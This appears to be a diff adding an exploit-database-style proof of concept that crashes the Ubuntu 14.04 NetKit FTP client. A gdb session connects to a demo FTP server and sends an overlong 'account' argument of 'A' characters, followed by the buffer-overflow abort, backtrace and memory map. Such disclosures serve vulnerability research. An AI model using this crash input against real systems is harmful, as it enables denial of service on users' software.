@@ -1,0 +1,120 @@
+###
+#[+] Author: TUNISIAN CYBER
+#[+] Exploit Title: Ubuntu 14.04 NetKit FTP Client Crash/DoS POC
+#[+] Date: 15-08-2015
+#[+] Type: Local Exploits
+#[+] Tested on: Ubuntu 14.04
+                Works with other distros (11.04:https://www.exploit-db.com/exploits/17806/)
+#[+] Twitter: @TCYB3R
+##
+
+cyb3rus@ubuntu:~$ gdp ftp
+No command 'gdp' found, but there are 17 similar ones
+gdp: command not found
+cyb3rus@ubuntu:~$ gdb ftp
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ftp...(no debugging symbols found)...done.
+(gdb) run ftp-server.demo.solarwinds.com
+Starting program: /usr/bin/ftp ftp-server.demo.solarwinds.com
+Connected to ftp-server.demo.solarwinds.com.
+220 Serv-U FTP Server v15.1 ready...
+Name (ftp-server.demo.solarwinds.com:cyb3rus): demo
+331 User name okay, need password.
+Password:
+230 User logged in, proceed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> account AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*** buffer overflow detected ***: /usr/bin/ftp terminated
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x7338f)[0x7ffff784238f]
+/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7ffff78d9c9c]
+/lib/x86_64-linux-gnu/libc.so.6(+0x109b60)[0x7ffff78d8b60]
+/lib/x86_64-linux-gnu/libc.so.6(__strncat_chk+0x13c)[0x7ffff78d7f9c]
+/usr/bin/ftp[0x407a08]
+/usr/bin/ftp[0x402cd0]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf5)[0x7ffff77f0ec5]
+/usr/bin/ftp[0x402f49]
+======= Memory map: ========
+00400000-00413000 r-xp 00000000 08:01 656161                             /usr/bin/netkit-ftp
+00612000-00613000 r--p 00012000 08:01 656161                             /usr/bin/netkit-ftp
+00613000-00615000 rw-p 00013000 08:01 656161                             /usr/bin/netkit-ftp
+00615000-00665000 rw-p 00000000 00:00 0                                  [heap]
+7ffff5e4e000-7ffff5e64000 r-xp 00000000 08:01 5771565                    /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff5e64000-7ffff6063000 ---p 00016000 08:01 5771565                    /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff6063000-7ffff6064000 rw-p 00015000 08:01 5771565                    /lib/x86_64-linux-gnu/libgcc_s.so.1
+7ffff6064000-7ffff6746000 r--p 00000000 08:01 662545                     /usr/lib/locale/locale-archive
+7ffff6746000-7ffff675d000 r-xp 00000000 08:01 5771664                    /lib/x86_64-linux-gnu/libresolv-2.19.so
+7ffff675d000-7ffff695d000 ---p 00017000 08:01 5771664                    /lib/x86_64-linux-gnu/libresolv-2.19.so
+7ffff695d000-7ffff695e000 r--p 00017000 08:01 5771664                    /lib/x86_64-linux-gnu/libresolv-2.19.so
+7ffff695e000-7ffff695f000 rw-p 00018000 08:01 5771664                    /lib/x86_64-linux-gnu/libresolv-2.19.so
+7ffff695f000-7ffff6961000 rw-p 00000000 00:00 0 
+7ffff6961000-7ffff6966000 r-xp 00000000 08:01 5771611                    /lib/x86_64-linux-gnu/libnss_dns-2.19.so
+7ffff6966000-7ffff6b65000 ---p 00005000 08:01 5771611                    /lib/x86_64-linux-gnu/libnss_dns-2.19.so
+7ffff6b65000-7ffff6b66000 r--p 00004000 08:01 5771611                    /lib/x86_64-linux-gnu/libnss_dns-2.19.so
+7ffff6b66000-7ffff6b67000 rw-p 00005000 08:01 5771611                    /lib/x86_64-linux-gnu/libnss_dns-2.19.so
+7ffff6b67000-7ffff6b69000 r-xp 00000000 08:01 5771619                    /lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2
+7ffff6b69000-7ffff6d68000 ---p 00002000 08:01 5771619                    /lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2
+7ffff6d68000-7ffff6d69000 r--p 00001000 08:01 5771619                    /lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2
+7ffff6d69000-7ffff6d6a000 rw-p 00002000 08:01 5771619                    /lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2
+7ffff6d6a000-7ffff6d75000 r-xp 00000000 08:01 5771623                    /lib/x86_64-linux-gnu/libnss_nis-2.19.so
+7ffff6d75000-7ffff6f74000 ---p 0000b000 08:01 5771623                    /lib/x86_64-linux-gnu/libnss_nis-2.19.so
+7ffff6f74000-7ffff6f75000 r--p 0000a000 08:01 5771623                    /lib/x86_64-linux-gnu/libnss_nis-2.19.so
+7ffff6f75000-7ffff6f76000 rw-p 0000b000 08:01 5771623                    /lib/x86_64-linux-gnu/libnss_nis-2.19.so
+7ffff6f76000-7ffff6f8d000 r-xp 00000000 08:01 5771607                    /lib/x86_64-linux-gnu/libnsl-2.19.so
+7ffff6f8d000-7ffff718c000 ---p 00017000 08:01 5771607                    /lib/x86_64-linux-gnu/libnsl-2.19.so
+7ffff718c000-7ffff718d000 r--p 00016000 08:01 5771607                    /lib/x86_64-linux-gnu/libnsl-2.19.so
+7ffff718d000-7ffff718e000 rw-p 00017000 08:01 5771607                    /lib/x86_64-linux-gnu/libnsl-2.19.so
+7ffff718e000-7ffff7190000 rw-p 00000000 00:00 0 
+7ffff7190000-7ffff7199000 r-xp 00000000 08:01 5771609                    /lib/x86_64-linux-gnu/libnss_compat-2.19.so
+7ffff7199000-7ffff7398000 ---p 00009000 08:01 5771609                    /lib/x86_64-linux-gnu/libnss_compat-2.19.so
+7ffff7398000-7ffff7399000 r--p 00008000 08:01 5771609                    /lib/x86_64-linux-gnu/libnss_compat-2.19.so
+7ffff7399000-7ffff739a000 rw-p 00009000 08:01 5771609                    /lib/x86_64-linux-gnu/libnss_compat-2.19.so
+7ffff739a000-7ffff73a5000 r-xp 00000000 08:01 5771613                    /lib/x86_64-linux-gnu/libnss_files-2.19.so
+7ffff73a5000-7ffff75a4000 ---p 0000b000 08:01 5771613                    /lib/x86_64-linux-gnu/libnss_files-2.19.so
+7ffff75a4000-7ffff75a5000 r--p 0000a000 08:01 5771613                    /lib/x86_64-linux-gnu/libnss_files-2.19.so
+7ffff75a5000-7ffff75a6000 rw-p 0000b000 08:01 5771613                    /lib/x86_64-linux-gnu/libnss_files-2.19.so
+7ffff75a6000-7ffff75cb000 r-xp 00000000 08:01 5771684                    /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7ffff75cb000-7ffff77ca000 ---p 00025000 08:01 5771684                    /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7ffff77ca000-7ffff77ce000 r--p 00024000 08:01 5771684                    /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7ffff77ce000-7ffff77cf000 rw-p 00028000 08:01 5771684                    /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7ffff77cf000-7ffff798a000 r-xp 00000000 08:01 5771538                    /lib/x86_64-linux-gnu/libc-2.19.so
+7ffff798a000-7ffff7b89000 ---p 001bb000 08:01 5771538                    /lib/x86_64-linux-gnu/libc-2.19.so
+7ffff7b89000-7ffff7b8d000 r--p 001ba000 08:01 5771538                    /lib/x86_64-linux-gnu/libc-2.19.so
+7ffff7b8d000-7ffff7b8f000 rw-p 001be000 08:01 5771538                    /lib/x86_64-linux-gnu/libc-2.19.so
+7ffff7b8f000-7ffff7b94000 rw-p 00000000 00:00 0 
+7ffff7b94000-7ffff7bd1000 r-xp 00000000 08:01 5771663                    /lib/x86_64-linux-gnu/libreadline.so.6.3
+7ffff7bd1000-7ffff7dd1000 ---p 0003d000 08:01 5771663                    /lib/x86_64-linux-gnu/libreadline.so.6.3
+7ffff7dd1000-7ffff7dd3000 r--p 0003d000 08:01 5771663                    /lib/x86_64-linux-gnu/libreadline.so.6.3
+7ffff7dd3000-7ffff7dd9000 rw-p 0003f000 08:01 5771663                    /lib/x86_64-linux-gnu/libreadline.so.6.3
+7ffff7dd9000-7ffff7dda000 rw-p 00000000 00:00 0 
+7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 5771514                    /lib/x86_64-linux-gnu/ld-2.19.so
+7ffff7fdf000-7ffff7fe2000 rw-p 00000000 00:00 0 
+7ffff7fea000-7ffff7feb000 rw-p 00000000 00:00 0 
+7ffff7feb000-7ffff7ff2000 r--s 00000000 08:01 920152                     /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
+7ffff7ff2000-7ffff7ff8000 rw-p 00000000 00:00 0 
+7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
+7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
+7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 5771514                    /lib/x86_64-linux-gnu/ld-2.19.so
+7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 5771514                    /lib/x86_64-linux-gnu/ld-2.19.so
+7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
+7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+Program received signal SIGABRT, Aborted.
+0x00007ffff7805cc9 in __GI_raise (sig=sig@entry=6)
+    at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
+56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
